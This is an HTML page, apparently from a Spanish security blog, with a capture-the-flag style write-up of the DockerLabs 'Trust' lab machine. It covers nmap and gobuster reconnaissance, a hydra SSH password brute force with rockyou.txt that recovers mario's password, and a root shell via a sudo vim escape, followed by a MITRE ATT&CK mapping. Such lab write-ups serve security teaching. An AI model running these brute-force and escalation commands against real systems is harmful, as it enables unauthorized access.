@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina Trust | ZsZsec</title>
+<meta content="Escaneo de Puertos con Nmap Como primer paso, realizamos un escaneo completo del sistema objetivo para identificar servicios expuestos. Utilizamos nmap con varios parámetros para o..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">DockerLabs</p>
+<h1>Maquina Trust<span>_</span></h1>
+<div class="writeup-meta"><span>Nmap / gobuster / SUID</span></div>
+<div class="tag-row"><span class="tag">Nmap</span><span class="tag">gobuster</span><span class="tag">SUID</span><span class="tag">vim</span><span class="tag">Escalada_Privilegios</span><span class="tag">ssh</span><span class="tag">hydra</span><span class="tag">fuerza_bruta</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h2><strong>Escaneo de Puertos con Nmap</strong></h2>
+<p>Como primer paso, realizamos un escaneo completo del sistema objetivo para identificar servicios expuestos. Utilizamos <code>nmap</code> con varios parámetros para obtener la mayor cantidad de información posible de forma eficiente:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/Downloads/trust]
+└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 172.18.0.2  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-08 18:37 CDT
+Nmap scan report for 172.18.0.2
+Host is up (0.000015s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
+|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
+80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.57 (Debian)
+MAC Address: 02:42:AC:12:00:02 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds
+</code></pre>
+<h3>Explicación de los parámetros:</h3>
+<ul>
+<li><p><code>-sS</code>: Realiza un escaneo <strong>SYN stealth</strong>, más rápido y menos detectable que uno completo (<code>-sT</code>).</p>
+</li>
+<li><p><code>-sV</code>: Permite detectar la <strong>versión de los servicios</strong> que corren en cada puerto.</p>
+</li>
+<li><p><code>-Pn</code>: Desactiva el <strong>ping previo</strong>. Esto es útil si el host no responde a ICMP (ping) y queremos forzar el escaneo.</p>
+</li>
+<li><p><code>-p-</code>: Escanea <strong>todos los puertos TCP</strong>, del 1 al 65535.</p>
+</li>
+<li><p><code>-sC</code>: Ejecuta <strong>scripts por defecto</strong> de Nmap, que identifican configuraciones inseguras o información útil.</p>
+</li>
+<li><p><code>--min-rate 5000</code>: Aumenta la velocidad del escaneo a <strong>5,000 paquetes por segundo</strong>.</p>
+</li>
+</ul>
+<h3>Resultado:</h3>
+<p>El escaneo reveló dos puertos abiertos:</p>
+<ul>
+<li><strong>22/tcp</strong> – SSH (acceso remoto seguro)</li>
+<li><strong>80/tcp</strong> – HTTP (servidor web Apache)</li>
+</ul>
+<h2><strong>Análisis del sitio web (Puerto 80)</strong></h2>
+<p>Al visitar <code>http://172.18.0.2</code>, encontramos una página web que muestra un <strong>panel por defecto de Apache</strong>, lo que sugiere que el servidor web está activo pero no tiene un sitio principal configurado.</p>
+<p>Como no había nada interesante visible directamente, decidimos buscar rutas ocultas o no indexadas utilizando <strong>fuerza bruta de directorios</strong> con <code>gobuster</code>.</p>
+<h2><strong>Fuerza Bruta de Directorios con Gobuster</strong></h2>
+<p>Ejecutamos <code>gobuster</code> usando una wordlist grande para maximizar las posibilidades de encontrar rutas útiles:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/Downloads/trust]
+└─$ gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,php,html,py -t 40
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.18.0.2
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,php,html,py
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 275]
+/index.html           (Status: 200) [Size: 10701]
+/.html                (Status: 403) [Size: 275]
+/secret.php           (Status: 200) [Size: 927]
+/.php                 (Status: 403) [Size: 275]
+/.html                (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+Progress: 2982381 / 6369165 (46.83%)^Z
+zsh: suspended  gobuster dir -u http://172.18.0.2 -w  -x txt,php,html,py -t 40
+</code></pre>
+<h3>Explicación de los parámetros:</h3>
+<ul>
+<li><code>-u</code>: URL objetivo.</li>
+<li><code>-w</code>: Wordlist a usar. En este caso, una lista grande de Seclists.</li>
+<li><code>-x</code>: Extensiones a probar: <code>.txt</code>, <code>.php</code>, <code>.html</code>, <code>.py</code>.</li>
+<li><code>-t</code>: Número de hilos paralelos 40 para mayor velocidad.</li>
+</ul>
+<h4>Resultados relevantes:</h4>
+<pre><code class="language-bash">/index.html           (Status: 200)
+/secret.php           (Status: 200)
+/server-status        (Status: 403)
+/.php                 (Status: 403)
+/.html                (Status: 403)
+</code></pre>
+<p>Encontramos una página interesante: <code>secret.php</code>.</p>
+<h2><strong>Inspección de <code>secret.php</code></strong></h2>
+<p>Al visitar <code>http://172.18.0.2/secret.php</code>, la página muestra un mensaje curioso:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/5085604e-4bfb-4bac-a997-06d6531fa612"/></p>
+<p>Este mensaje sugiere la existencia de un usuario llamado <strong>mario</strong>, lo cual nos da una <strong>pista directa de un posible nombre de usuario para acceso SSH</strong>.</p>
+<h2><strong>Ataque de fuerza bruta SSH con Hydra</strong></h2>
+<p>Ya que el puerto <strong>22/SSH</strong> estaba abierto y teníamos un posible nombre de usuario (<code>mario</code>), decidimos lanzar un ataque de fuerza bruta con <code>hydra</code> para descubrir su contraseña.</p>
+<p>Usamos la famosa wordlist <code>rockyou.txt</code>, que contiene millones de contraseñas comunes:</p>
+<pre><code class="language-bash">zikuta㉿zikuta)-[~/Downloads/trust]
+└─$ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2 
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-08 18:27:45
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://172.18.0.2:22/
+[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
+^Z
+zsh: suspended  hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
+</code></pre>
+<p><em>Nota:</em> Inicialmente cometimos el error de usar <code>-p</code> (una sola contraseña), en vez de <code>-P</code> (una lista). Esto fue corregido rápidamente.</p>
+<h3>Resultado:</h3>
+<p>Hydra encontró las credenciales válidas:</p>
+<ul>
+<li><strong>Usuario:</strong> <code>mario</code></li>
+<li><strong>Contraseña:</strong> <code>chocolate</code></li>
+</ul>
+<h2><strong>Acceso por SSH como mario</strong></h2>
+<p>Usamos las credenciales obtenidas para iniciar sesión por SSH:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/Downloads/trust]
+└─$ ssh mario@172.18.0.2          
+The authenticity of host '172.18.0.2 (172.18.0.2)' can't be established.
+ED25519 key fingerprint is SHA256:z6uc1wEgwh6GGiDrEIM8ABQT1LGC4CfYAYnV4GXRUVE.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.18.0.2' (ED25519) to the list of known hosts.
+mario@172.18.0.2's password: 
+Permission denied, please try again.
+mario@172.18.0.2's password: 
+Linux 1a6aad2c534d 6.12.13-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.13-1kali1 (2025-02-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
+</code></pre>
+<p>Ingresamos la contraseña <code>chocolate</code> y obtuvimos una shell como el usuario <code>mario</code>.</p>
+<h2><strong>Escalada de privilegios con <code>sudo -l</code></strong></h2>
+<p>Una vez dentro, lo primero que hicimos fue verificar los privilegios del usuario con <code>sudo</code>:</p>
+<pre><code class="language-bash">mario@1a6aad2c534d:~$ sudo -l
+[sudo] password for mario: 
+Matching Defaults entries for mario on 1a6aad2c534d:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User mario may run the following commands on 1a6aad2c534d:
+    (ALL) /usr/bin/vim
+</code></pre>
+<p>Esto indica que <strong>el usuario <code>mario</code> puede ejecutar <code>vim</code> como root sin contraseña</strong>, lo cual es una vía directa para escalar privilegios.</p>
+<h2><strong>Escalada a root usando Vim</strong></h2>
+<p>Sabemos que <code>vim</code> tiene la capacidad de ejecutar comandos de sistema usando <code>:!comando</code>. Aprovechamos esto para invocar una shell como root.</p>
+<pre><code class="language-bash">mario@1a6aad2c534d:~$ sudo /usr/bin/vim  vim -c ':!/bin/sh'
+
+# whoami
+root
+</code></pre>
+<p>¡Hemos conseguido acceso completo como root!</p>
+<h2><strong>Resumen</strong></h2>
+<table>
+<thead>
+<tr>
+<th>Paso</th>
+<th>Acción</th>
+<th>Resultado</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Escaneo Nmap</td>
+<td>Puertos 22 (SSH) y 80 (HTTP) abiertos</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Análisis web</td>
+<td>Página default de Apache</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Gobuster</td>
+<td>Encontrado <code>secret.php</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>secret.php</code></td>
+<td>Descubrimiento del usuario <code>mario</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>Hydra</td>
+<td>Contraseña encontrada: <code>chocolate</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>Acceso SSH</td>
+<td>Login exitoso como <code>mario</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td><code>sudo -l</code></td>
+<td>Permisos para usar <code>vim</code> como root</td>
+</tr>
+<tr>
+<td>8</td>
+<td>Escalada con Vim</td>
+<td>Acceso root conseguido</td>
+</tr>
+</tbody>
+</table>
+<h1>MITRE ATT&amp;CK</h1>
+<table>
+<thead>
+<tr>
+<th>Táctica</th>
+<th>Técnica</th>
+<th>ID</th>
+<th>Descripción</th>
+<th>Dónde se aplicó</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Reconnaissance</strong></td>
+<td>Search Open Websites/Domains</td>
+<td>T1593</td>
+<td>Se accede al sitio web para identificar contenido o pistas</td>
+<td>Acceso manual a <code>http://172.18.0.2</code>, revisión de <code>index.html</code> y <code>secret.php</code></td>
+</tr>
+<tr>
+<td><strong>Reconnaissance</strong></td>
+<td>Active Scanning</td>
+<td>T1595.002</td>
+<td>Escaneo activo de puertos y servicios</td>
+<td><code>nmap -sV -sS -Pn -p- -sC</code></td>
+</tr>
+<tr>
+<td><strong>Resource Development</strong></td>
+<td>Acquire Capabilities</td>
+<td>T1588.002</td>
+<td>Uso de herramientas y recursos previos al ataque</td>
+<td>Uso de <code>Hydra</code>, <code>Gobuster</code>, y wordlists (<code>rockyou.txt</code>, <code>seclists</code>)</td>
+</tr>
+<tr>
+<td><strong>Initial Access</strong></td>
+<td>Brute Force: Password Guessing</td>
+<td>T1110.001</td>
+<td>Fuerza bruta a SSH con una lista de contraseñas</td>
+<td><code>hydra -l mario -P rockyou.txt ssh://172.18.0.2</code></td>
+</tr>
+<tr>
+<td><strong>Execution</strong></td>
+<td>Command and Scripting Interpreter: Bash</td>
+<td>T1059.004</td>
+<td>Uso de la terminal para ejecutar comandos como usuario y como root</td>
+<td>Shell por SSH y luego shell como root vía Vim</td>
+</tr>
+<tr>
+<td><strong>Execution</strong></td>
+<td>Exploitation for Privilege Escalation</td>
+<td>T1068</td>
+<td>Explotación de una mala configuración para ganar privilegios</td>
+<td>Abuso del <code>sudo</code> sobre Vim</td>
+</tr>
+<tr>
+<td><strong>Execution</strong></td>
+<td>Indirect Command Execution</td>
+<td>T1202</td>
+<td>Ejecución de comandos usando Vim como intermediario</td>
+<td><code>sudo vim -c ':!bash'</code></td>
+</tr>
+<tr>
+<td><strong>Privilege Escalation</strong></td>
+<td>Abuse Elevation Control Mechanism: Sudo</td>
+<td>T1548.001</td>
+<td>Uso de <code>sudo</code> para ejecutar Vim como root sin contraseña</td>
+<td><code>sudo -l</code> → <code>/usr/bin/vim</code></td>
+</tr>
+<tr>
+<td><strong>Defense Evasion</strong></td>
+<td>Indirect Command Execution</td>
+<td>T1202</td>
+<td>Evita detección al no ejecutar directamente <code>/bin/bash</code> o <code>sudo bash</code></td>
+<td>Uso de <code>vim</code> como vector de evasión</td>
+</tr>
+<tr>
+<td><strong>Defense Evasion</strong></td>
+<td>Indicator Removal on Host (potencial)</td>
+<td>T1070</td>
+<td>Se podrían eliminar logs o huellas como root</td>
+<td>No se ejecutó, pero sería posible después de obtener root</td>
+</tr>
+<tr>
+<td><strong>Credential Access</strong></td>
+<td>Unsecured Credentials</td>
+<td>T1552</td>
+<td>Obtención de nombre de usuario desde archivo web expuesto</td>
+<td><code>secret.php</code> expone el nombre <code>mario</code></td>
+</tr>
+<tr>
+<td><strong>Discovery</strong></td>
+<td>System Owner/User Discovery</td>
+<td>T1033</td>
+<td>Comando para identificar el usuario actual del sistema</td>
+<td><code>whoami</code></td>
+</tr>
+<tr>
+<td><strong>Discovery</strong></td>
+<td>System Information Discovery</td>
+<td>T1082</td>
+<td>Identificación del sistema operativo o hostname</td>
+<td>Comandos como <code>uname -a</code>, <code>hostname</code>, etc.</td>
+</tr>
+<tr>
+<td><strong>Collection</strong></td>
+<td>Input Capture (comandos)</td>
+<td>T1056</td>
+<td>Recolección de información mediante comandos en shell</td>
+<td>Se inspecciona el entorno del sistema tras acceder</td>
+</tr>
+<tr>
+<td><strong>Impact</strong></td>
+<td>Account Manipulation (potencial)</td>
+<td>T1098</td>
+<td>Una vez con root, sería posible crear/eliminar usuarios</td>
+<td>No se ejecutó, pero es factible tras escalar privilegios</td>
+</tr>
+</tbody>
+</table>
+<h2>Conclusión</h2>
+<p>La máquina <strong>Trust</strong> es un excelente ejemplo de cómo una configuración aparentemente simple puede llevar a una escalada total si no se aplican medidas de seguridad adecuadas. Desde una página web vacía con un archivo oculto, pasando por un ataque de diccionario sobre SSH, hasta una mala configuración de sudo con <code>vim</code>, todo se conecta de forma lógica. Ideal para principiantes que están aprendiendo a unir las piezas del hacking ético.</p>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
